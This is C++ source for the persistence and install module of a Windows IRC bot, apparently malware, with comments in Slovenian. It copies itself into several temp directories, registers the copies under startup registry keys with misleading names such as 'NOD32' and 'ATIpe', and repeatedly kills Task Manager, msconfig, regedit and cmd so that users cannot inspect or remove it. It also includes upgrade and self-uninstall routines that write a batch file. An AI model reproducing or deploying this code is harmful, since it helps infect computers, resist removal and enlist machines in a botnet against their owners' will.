#include "Security.h"

Sec::Sec()
{
	IRC_FILE = new char[MAX_PATH];
	memset(IRC_FILE, '\0', MAX_PATH);
	IRC_FILE = IRC_F;

	///////////////////////////////////

	path1_dir    = new char[MAX_PATH];
	path2_dir    = new char[MAX_PATH];
	path3_dir    = new char[MAX_PATH];
	path4_dir    = new char[MAX_PATH];
	irc_path_dir = new char[MAX_PATH];

	path1_file   = new char[MAX_PATH];
	path2_file   = new char[MAX_PATH];
	path3_file   = new char[MAX_PATH];
	path4_file   = new char[MAX_PATH];
	irc_path_file= new char[MAX_PATH];

	path1_exec   = new char[MAX_PATH];
	path2_exec   = new char[MAX_PATH];
	path3_exec   = new char[MAX_PATH];
	path4_exec   = new char[MAX_PATH];
	irc_path_exec= new char[MAX_PATH];

	temp_long    = new char[MAX_PATH];
	temp_short   = new char[MAX_PATH];

	memset(path1_dir, '\0', MAX_PATH);
	memset(path2_dir, '\0', MAX_PATH);
	memset(path3_dir, '\0', MAX_PATH);
	memset(path4_dir, '\0', MAX_PATH);
	memset(irc_path_dir, '\0', MAX_PATH);

	memset(path1_file, '\0', MAX_PATH);
	memset(path2_file, '\0', MAX_PATH);
	memset(path3_file, '\0', MAX_PATH);
	memset(path4_file, '\0', MAX_PATH);
	memset(irc_path_file, '\0', MAX_PATH);
	
	memset(path1_exec, '\0', MAX_PATH);
	memset(path2_exec, '\0', MAX_PATH);
	memset(path3_exec, '\0', MAX_PATH);
	memset(path4_exec, '\0', MAX_PATH);
	memset(irc_path_exec, '\0', MAX_PATH);

	memset(temp_long, '\0', MAX_PATH);
	memset(temp_short, '\0', MAX_PATH);

	temp_long  = GetTempDir(1);
	temp_short = GetTempDir(2);

	///////////////////////////////////
	strcat(path1_dir, temp_long);
	strcat(path1_dir, FIRST_DIR);

	strcat(path2_dir, temp_long);
	strcat(path2_dir, SECOND_DIR);

	strcat(path3_dir, temp_long);
	strcat(path3_dir, THIRD_DIR);

	strcat(path4_dir, temp_long);
	strcat(path4_dir, FORTH_DIR);

	strcat(irc_path_dir, temp_long);
	strcat(irc_path_dir, IRC_DIR);

	////////////////////////////////////

	strcat(path1_file, temp_long);
	strcat(path1_file, FIRST_DIR);
	strcat(path1_file, "\\");
	strcat(path1_file, FIRST_FILE);

	strcat(path2_file, temp_long);
	strcat(path2_file, SECOND_DIR);
	strcat(path2_file, "\\");
	strcat(path2_file, SECOND_FILE);

	strcat(path3_file, temp_long);
	strcat(path3_file, THIRD_DIR);
	strcat(path3_file, "\\");
	strcat(path3_file, THIRD_FILE);

	strcat(path4_file, temp_long);
	strcat(path4_file, FORTH_DIR);
	strcat(path4_file, "\\");
	strcat(path4_file, FORTH_FILE);

	strcat(irc_path_file, temp_long);
	strcat(irc_path_file, IRC_DIR);
	strcat(irc_path_file, "\\");
	strcat(irc_path_file, IRC_FILE); 

	/*///\\\///\\\///\\\///\\\///\\\*/
	   /* CREATING EXECUTED PATH */
	strcat(path1_exec, temp_short);
	strcat(path1_exec, FIRST_DIR);
	strcat(path1_exec, "\\");
	strcat(path1_exec, FIRST_FILE);

	strcat(path2_exec, temp_short);
	strcat(path2_exec, SECOND_DIR);
	strcat(path2_exec, "\\");
	strcat(path2_exec, SECOND_FILE);

	strcat(path3_exec, temp_short);
	strcat(path3_exec, THIRD_DIR);
	strcat(path3_exec, "\\");
	strcat(path3_exec, THIRD_FILE);

	strcat(path4_exec, temp_short);
	strcat(path4_exec, FORTH_DIR);
	strcat(path4_exec, "\\");
	strcat(path4_exec, FORTH_FILE);

    strcat(irc_path_exec, temp_short);
	strcat(irc_path_exec, IRC_DIR);
	strcat(irc_path_exec, "\\");
	strcat(irc_path_exec, IRC_FILE);     

	///////////////////////////////////
}

char *Sec::GetTempDir(int w)
{
	int retlen;
	char *ret;
	char szDirShort[MAX_PATH + 1], szDirLong[MAX_PATH + 1];
	::GetTempPath((sizeof(szDirShort) / sizeof(szDirShort[0])), szDirShort);
	::GetLongPathName(szDirShort, szDirLong, (sizeof(szDirLong) / sizeof(szDirLong[0])));
	
	if(w == 1)
	{
		retlen = strlen(szDirLong);
		ret = new char[retlen];
		sprintf(ret, "%s", szDirLong);
	}
	if(w == 2)
	{
		retlen = strlen(szDirShort);
		ret = new char[retlen];
		sprintf(ret, "%s", szDirShort); 
	}
	
	return ret;
}

char *Sec::GetFileName()
{
	int flen;
	char *f;
	char szAppPath[MAX_PATH] = "";
	std::string strAppName; // name of executed file saved here
	::GetModuleFileName(0, szAppPath, MAX_PATH);
	strAppName = szAppPath;
	strAppName = strAppName.substr(strAppName.rfind("\\") + 1);

	flen = strlen(strAppName.c_str());
	f = new char[flen];
	sprintf(f, "%s", strAppName.c_str());

	return f;
}

char *Sec::GetFilePath(char *fname)
{
	int flen;
	char *f;
	char full[_MAX_PATH];
	_fullpath(full, fname, _MAX_PATH);
	flen = strlen(full);
	f = new char[flen];
	sprintf(f, "%s", full);
	return f;
}

// C:\Documents and Settings\tech\Local Settings\Temp\ */
DWORD Sec::MakeDirectory(char *new_dir_name)
{
	DWORD return_me = 0;
    if(CreateDirectory(new_dir_name, 0) == 0)
	{
		return_me = GetLastError(); 
	}
	return return_me; // if 183 allready exist
}

DWORD Sec::MakeFile(char *new_file_name)
{
	DWORD return_me = 0;
	char *file_name = GetFileName();
	char *file_path = GetFilePath(file_name);

	if(CopyFile(file_path, new_file_name, TRUE) == 0)
	{
		return_me = GetLastError();
	}
	return return_me; // if 183 allready exist
}

int Sec::StartProcess(char *file)
{
	int return_me = 0;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess( NULL, 
        TEXT(file), 
        NULL,
        NULL,
        FALSE, 
        /*CREATE_DEFAULT_ERROR_MODE*/ NULL,
        NULL, 
        NULL,
        &si,
        &pi )
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
		return_me = GetLastError();
    }

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

	return return_me;
}

void Sec::KillProcess(DWORD pID)
{
	HANDLE ps = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, FALSE, pID);
	WaitForSingleObject(ps, 0);

	TerminateProcess(ps, 0);

	CloseHandle(ps);
}

DWORD Sec::CheckFileRunning(char *file, int w)
{
	int chk = 0;
	DWORD return_me = 0;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// kopiramo celotno sliko procesov v sistemu
	hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("ERROR: CreateToolhelp32Snapshot\n");
		system("pause");
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if( !Process32First( hProcessSnap, &pe32 ) )
	{
		printf("ERROR: Process32First\n");
		system("pause");
		return 0;
	}
	// sedaj se sprehodimo skozi procese in izpisemo informacije 
	// za vsak proces

	do
	{
		if(w == 1) // ce je w = 1 returnamo 1 kr proces obstaja
		{
			if(strcmp(file, pe32.szExeFile) == 0)
			{
				return_me = 1;
			}
		}
		
		if(w == 2) // ce je w = 2 returnamo PID od procesa
		{
            if(strcmp(file, pe32.szExeFile) == 0)
			{
				//cout << file << " PID: " << pe32.th32ProcessID << endl;
				KillProcess(pe32.th32ProcessID);
				//return_me = pe32.th32ProcessID;
			}
		}

		if(w == 3)
		{
			if(strcmp(file, pe32.szExeFile) == 0)
			{
                chk++;
				if(chk >= 2)
				{
					KillProcess(pe32.th32ProcessID);
					//cout << "Killam DRUGI IRC FILE" << endl;
				}
			}
		}
	}
	while( Process32Next( hProcessSnap, &pe32 ) );

	CloseHandle(hProcessSnap);

	return return_me;
}

void Sec::ProtectFiles(char *path_dir, char *path_file, char *path_exec, char *file_name)
{
	/* unici task meneger!*/
	CheckFileRunning("taskmgr.exe", 2);
	CheckFileRunning("msconfig.exe", 2);
	CheckFileRunning("regedit.exe", 2);
	CheckFileRunning("cmd.exe", 2);

	/*Use USE;
	char *tsz = new char[MAX_PATH];
	memset(tsz, '\0', MAX_PATH);
	sprintf(tsz, "%s\n", path_file);
	USE.Zapisi("c:\\MBOTT.txt", tsz);*/

	if(MakeDirectory(path_dir) != 183) // 183 ce ni direktoria
	{
		if(MakeFile(path_file) != 183) // 183 ce ni fila
		{
			if(CheckFileRunning(file_name, 1) == 0) // ce procesa ni
			{
				if(StartProcess(path_exec) == 3) // ce poti do procesa ni
				{
					MakeDirectory(path_dir);
				}
				if(StartProcess(path_exec) == 2)
				{
					//MakeFile(path_file);
					//cout << path_file << endl;
				}
			}
		}
	}
	else
	{
        if(MakeFile(path_file) != 183)
		{
			if(CheckFileRunning(file_name, 1) == 0)
			{
				if(StartProcess(path_exec) == 3)
				{
					//MakeDirectory(path_dir);
					//MakeFile(path_file);
					//StartProcess(file_name);
				}
			}
		}
	}

	/* ce runa vec ko en file za vsakega naslednjega killa */
	CheckFileRunning(IRC_F, 3);
	CheckFileRunning(FILE1, 3);
	CheckFileRunning(FILE2, 3);
	CheckFileRunning(FILE3, 3);
	CheckFileRunning(FILE4, 3);
}

char *Sec::BotInstall()
{
	WinStartup WS;
	ProtectFiles(path1_dir, path1_file, path1_exec, FIRST_FILE);
	WS.AddApp("NOD32", path1_exec, HKEY_LOCAL_MACHINE, 1);
	WS.AddApp("NOD32", path1_exec, HKEY_LOCAL_MACHINE, 2);
	WS.AddApp("NOD32", path1_exec, HKEY_CURRENT_USER, 1);
	Sleep(1500);

	ProtectFiles(path2_dir, path2_file, path2_exec, SECOND_FILE);
	WS.AddApp("Shell", path2_exec, HKEY_LOCAL_MACHINE, 1);
	WS.AddApp("Shell", path2_exec, HKEY_LOCAL_MACHINE, 2);
	WS.AddApp("Shell", path2_exec, HKEY_CURRENT_USER, 1);
	Sleep(1500);

	ProtectFiles(path3_dir, path3_file, path3_exec, THIRD_FILE);
	WS.AddApp("SmpAPP", path3_exec, HKEY_LOCAL_MACHINE, 1);
	WS.AddApp("SmpAPP", path3_exec, HKEY_LOCAL_MACHINE, 2);
	WS.AddApp("SmpAPP", path3_exec, HKEY_CURRENT_USER, 1);
	Sleep(1500);

	ProtectFiles(path4_dir, path4_file, path4_exec, FORTH_FILE);
	WS.AddApp("cApp", path4_exec, HKEY_LOCAL_MACHINE, 1);
	WS.AddApp("cApp", path4_exec, HKEY_LOCAL_MACHINE, 2);
	WS.AddApp("cApp", path4_exec, HKEY_CURRENT_USER, 1);
	Sleep(1500);

	ProtectFiles(irc_path_dir, irc_path_file, irc_path_exec, IRC_FILE);
	WS.AddApp("ATIpe", irc_path_exec, HKEY_LOCAL_MACHINE, 1);
	WS.AddApp("ATIpe", irc_path_exec, HKEY_LOCAL_MACHINE, 2);
	WS.AddApp("ATIpe", irc_path_exec, HKEY_CURRENT_USER, 1);
	Sleep(4000);

	char *ffile = GetFileName();
	if((strcmp(ffile, FIRST_FILE) != 0) && (strcmp(ffile, SECOND_FILE) != 0) && (strcmp(ffile, THIRD_FILE) != 0)
	&& (strcmp(ffile, FORTH_FILE) != 0) && (strcmp(ffile, IRC_FILE) != 0))
	{
		CheckFileRunning(ffile, 2);
	}

	return irc_path_file;
}

void Sec::BotUninstall()
{
	WinStartup WS;
	CheckFileRunning(EXEC_FILE, 2); // vpisi sem <- kar zazenes prvo!
	CheckFileRunning(FIRST_FILE, 2);
	CheckFileRunning(SECOND_FILE, 2);
	CheckFileRunning(THIRD_FILE, 2);
	CheckFileRunning(FORTH_FILE, 2);

	WS.DelApp("NOD32", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("NOD32", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("NOD32", HKEY_CURRENT_USER, 1);

	WS.DelApp("Shell", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("Shell", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("Shell", HKEY_CURRENT_USER, 1);

	WS.DelApp("SmpAPP", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("SmpAPP", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("SmpAPP", HKEY_CURRENT_USER, 1);

	WS.DelApp("cApp", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("cApp", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("cApp", HKEY_CURRENT_USER, 1);

	WS.DelApp("ATIpe", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("ATIpe", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("ATIpe", HKEY_CURRENT_USER, 1);

	DeleteFile(path1_file);
	RemoveDirectory(path1_dir);

	DeleteFile(path2_file);
	RemoveDirectory(path2_dir);

	DeleteFile(path3_file);
	RemoveDirectory(path3_dir);

	
	DeleteFile(path4_file);
	RemoveDirectory(path4_dir);
	
	BotUninstallBat();
	//StartProcess("C:\\echo.bat");
	ShellExecute(0, "open", "c:\\echo.bat", 0, 0, SW_HIDE);

	CheckFileRunning(IRC_F, 2);	
}

void Sec::BotUpgrade(char *new_path)
{
	WinStartup WS;
	CheckFileRunning(EXEC_FILE, 2); // vpisi sem <- kar zazenes prvo!
	CheckFileRunning(FIRST_FILE, 2);
	CheckFileRunning(SECOND_FILE, 2);
	CheckFileRunning(THIRD_FILE, 2);
	CheckFileRunning(FORTH_FILE, 2);

	WS.DelApp("NOD32", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("NOD32", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("NOD32", HKEY_CURRENT_USER, 1);

	WS.DelApp("Shell", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("Shell", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("Shell", HKEY_CURRENT_USER, 1);

	WS.DelApp("SmpAPP", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("SmpAPP", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("SmpAPP", HKEY_CURRENT_USER, 1);

	WS.DelApp("cApp", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("cApp", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("cApp", HKEY_CURRENT_USER, 1);

	WS.DelApp("ATIpe", HKEY_LOCAL_MACHINE, 1);
	WS.DelApp("ATIpe", HKEY_LOCAL_MACHINE, 2);
	WS.DelApp("ATIpe", HKEY_CURRENT_USER, 1);

	DeleteFile(path1_file);
	RemoveDirectory(path1_dir);

	DeleteFile(path2_file);
	RemoveDirectory(path2_dir);

	DeleteFile(path3_file);
	RemoveDirectory(path3_dir);

	DeleteFile(path4_file);
	RemoveDirectory(path4_dir);

	ShellExecute(0, "open", new_path, 0, 0, SW_SHOW);

	BotUninstallBat();
	//StartProcess("C:\\echo.bat");
	ShellExecute(0, "open", "c:\\echo.bat", 0, 0, SW_HIDE);

	CheckFileRunning(IRC_F, 2);	
}

void Sec::BotUninstallBat()
{
	FILE *f;
	f = fopen("c:\\echo.bat", "rw");
	if(f != 0)
	{
		DeleteFile("C:\\echo.bat");
	}
	fclose(f);

	FILE *ff;
	ff = fopen("c:\\echo.bat", "wa");

	char *temp    = new char[512];
    char *last    = new char[512];
	char *file_R  = new char[512];
	char *dir     = new char[512];

	memset(temp, '\0', 512);
	memset(last, '\0', 512);
	memset(file_R, '\0', 512);
	memset(dir, '\0', 512);

	temp = GetTempDir(2);

	strcat(file_R, "del ");
	strcat(file_R, temp);
	strcat(file_R, IRC_DIR);
	strcat(file_R, "\\");
	strcat(file_R, IRC_FILE);
	strcat(file_R, "\n");

	strcat(dir, "rmdir ");
	strcat(dir, temp);
	strcat(dir, IRC_DIR);
	strcat(dir, "\n");

	last = "@echo off\nFOR /L %%i IN (0 2 10000) DO ECHO       BiE biE L4m3r7!\n";
	
	fputs(last, ff);
	fputs(file_R, ff);
	fputs(dir, ff);
	fputs(dir, ff);
	fputs(dir, ff);

	fclose(ff);

	//delete temp, last, file_R, dir;
}